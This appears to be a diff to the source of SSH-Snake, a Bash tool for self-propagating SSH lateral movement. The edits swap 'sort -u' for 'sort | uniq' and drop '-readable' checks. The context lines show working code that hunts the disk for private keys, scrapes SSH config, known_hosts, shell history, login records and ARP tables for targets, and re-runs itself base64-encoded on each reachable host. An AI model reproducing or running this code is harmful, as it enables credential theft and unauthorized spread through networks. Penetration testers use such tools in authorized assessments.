@@ -260,7 +260,7 @@ printf "%s\n" "$line"
 done < <(echo 'printf "%s" "$1" | base64 -d | stdbuf -o0 bash --noprofile --norc -s $1' | stdbuf -o0 bash --noprofile --norc -s "$(printf "%s" "$local_script" | base64 | tr -d '\n')" 2>&1 | grep -v -F 'INTERNAL_MSG')
 [[ $use_retry_all_dests -eq 1 ]] || return
 local retried_interesting_dests
-retried_interesting_dests="$(gen_retried_interesting_dests | sort -u)"
+retried_interesting_dests="$(gen_retried_interesting_dests | sort | uniq)"
 [[ "${#retried_interesting_dests}" -gt 0 ]] || return
 printf "\n\n---------------------------------------\n\n"
 printf "use_retry_all_dests=1. Re-starting.\n"
@@ -325,8 +325,8 @@ printf "Unique shell accounts accessed: %s\n" "${#root_ssh_hostnames_dests[@]}"
 printf "Unique systems accessed: %s\n" "${#root_ssh_hosts[@]}"
 printf "\nNeed a list of servers accessed? Run one of these commands:\n\n"
 cat <<"EOF"
-grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort -u
-grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort -u
+grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort | uniq
+grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort | uniq
 EOF
 printf -- "-- https://joshua.hu/ --\n"
 printf -- "-- https://github.com/MegaManSec/SSH-Snake --\n"
@@ -335,7 +335,7 @@ printf "\nThanks for playing!\n"
 check_commands() {
 local required_commands
 local required_command
-required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "grep" "tr" "find" "cat" "stdbuf")
+required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "uniq" "grep" "tr" "find" "cat" "stdbuf")
 for required_command in "${required_commands[@]}"; do
 if ! command -v "$required_command" >/dev/null 2>&1; then
 echo "$required_command"
@@ -538,7 +538,7 @@ is_dir "$ssh_folder" || continue
 while IFS= read -r ssh_file; do
 is_file "$ssh_file" || continue
 ssh_files["$ssh_file"]=1
-done < <(${s} find -L "$ssh_folder" -type f -readable 2>/dev/null)
+done < <(${s} find -L "$ssh_folder" -type f 2>/dev/null)
 done
 }
 check_file_for_privkey() {
@@ -615,7 +615,7 @@ find_ssh_keys_paths() {
 local ssh_file
 while IFS= read -r ssh_file; do
 check_and_populate_keys "$ssh_file"
-done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -readable -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null)
+done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null)
 }
 check_potential_key_files() {
 local key_file
@@ -720,7 +720,7 @@ fi
 done
 [[ -z "$cached_ssh_user" ]] && add_ssh_user "$home_user" && cached_ssh_user="$home_user"
 [[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && add_ssh_dest "$cached_ssh_user@$cached_ssh_host"
-done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort -u)
+done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort | uniq)
 done
 }
 find_from_ssh_config() {
@@ -757,8 +757,8 @@ add_ssh_user "$cline_val"
 check_potential_key_files "$cline_val" "$home_folder"
 ;;
 esac
-done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort -u)
-done < <(${s} find -L "$home_folder/.ssh" -type f -readable 2>/dev/null)
+done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort | uniq)
+done < <(${s} find -L "$home_folder/.ssh" -type f 2>/dev/null)
 done
 }
 find_user_from_file() {
@@ -783,8 +783,8 @@ local ssh_host
 while IFS= read -r ssh_host; do
 add_ssh_host "$ssh_host"
 [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
-done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
-done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
+done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
+done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
 done
 }
 find_from_last() {
@@ -792,7 +792,7 @@ local ssh_dest
 last -aiw >/dev/null 2>&1 || return
 while IFS= read -r ssh_dest; do
 add_ssh_dest "$ssh_dest"
-done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort -u)
+done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort | uniq)
 }
 find_from_known_hosts() {
 local ssh_file
@@ -812,26 +812,26 @@ add_ssh_user "$ssh_user"
 add_ssh_host "$ssh_host"
 add_ssh_dest "$ssh_dest"
 [[ -n "$home_user" && -n "$ssh_host" ]] && add_ssh_dest "$home_user@$ssh_host"
-done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort -u)
+done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)
 done
 }
 find_from_hosts() {
 local ssh_host
 while IFS= read -r ssh_host; do
 add_ssh_host "$ssh_host"
-done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort -u)
+done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort | uniq)
 while IFS=": " read -r _ ssh_host; do
 add_ssh_host "$ssh_host"
-done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort -u)
+done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)
 }
 find_arp_neighbours() {
 local ssh_host
 while IFS= read -r ssh_host; do
 add_ssh_host "$ssh_host"
-done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u)
+done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq)
 while IFS= read -r ssh_host; do
 add_ssh_host "$ssh_host"
-done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u)
+done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq)
 }
 find_d_block() {
 local octets
